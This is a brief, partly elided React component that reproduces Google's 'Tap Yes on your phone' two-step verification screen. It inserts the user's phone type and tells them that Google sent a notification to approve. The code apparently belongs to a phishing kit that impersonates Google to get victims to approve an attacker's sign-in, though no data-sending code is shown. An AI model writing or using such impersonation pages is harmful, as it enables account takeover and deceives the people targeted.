...
import '../../public/styles/codeyes.css'; 
    ...
    <>
      <div className="maindiv">
        ...
        <div className="form-half1">
          <center>
                  <div className="gradient-box"><img src="/images/tap.gif" alt="Yes Recovery"/></div>
          </center>
          <div className="phonediv">
            <span className="phonetype">Check your {userInfo.mobiletype}</span><br /><br />
            <span className="messaged">Google sent a notification to your {userInfo.mobiletype}. Tap <b>Yes</b>&nbsp;on the notification on your phone to verify it's you.</span>
          </div>
